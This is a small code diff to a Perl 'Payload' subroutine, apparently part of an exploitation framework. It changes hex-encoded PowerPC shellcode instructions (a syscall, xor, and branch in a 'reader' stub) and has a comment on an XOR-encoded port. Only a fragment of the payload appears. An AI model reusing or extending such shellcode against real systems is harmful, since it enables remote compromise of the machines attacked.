@@ -76,7 +76,8 @@ sub Payload {
 		 0x44ffff02,     # 0x1df4 <reader+28>:     sc
 		 0x7ca52a78,     # 0x1df8 <reader+32>:     xor     r5,r5,r5
 		 0x7ca52a79,     # 0x1dfc <reader+36>:     xor.    r5,r5,r5
-		 0x4c810420,     # 0x1e00 <reader+40>:     blectr				 
+		 0x4c810420,     # 0x1e00 <reader+40>:     blectr
+		 0x7ca52a78,     # 0x1e04 <reader+44>:     xor     r5,r5,r5					 
 	);
 	
 	# 34 = port ^ port_key, 38 = port_key
